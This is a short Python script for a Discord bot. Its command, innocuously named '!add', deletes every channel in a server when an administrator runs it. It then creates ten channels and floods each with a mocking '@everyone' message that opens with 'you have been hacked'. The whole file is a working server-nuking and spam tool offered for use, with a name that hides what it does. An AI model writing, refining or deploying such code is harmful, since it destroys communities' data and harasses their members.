import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.command(name='add')
@commands.has_permissions(administrator=True)
async def add(ctx):
    guild = ctx.guild
    
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            await asyncio.sleep(1)

    roast_message = "Hi, you have been hacked... just kidding! We just wiped your horrible server for you to start alllllllllllllllllllllllll over again. Thank me later for saving u so much time. @everyone"

    for i in range(10):
        try:
            new_channel = await guild.create_text_channel(f'fresh-start-{i+1}')
            for j in range(10):
                await new_channel.send(roast_message)
                await asyncio.sleep(0.5)
        except:
            await asyncio.sleep(2)

bot.run('YA TOKEN HERE make sure ya dont share it with anyone')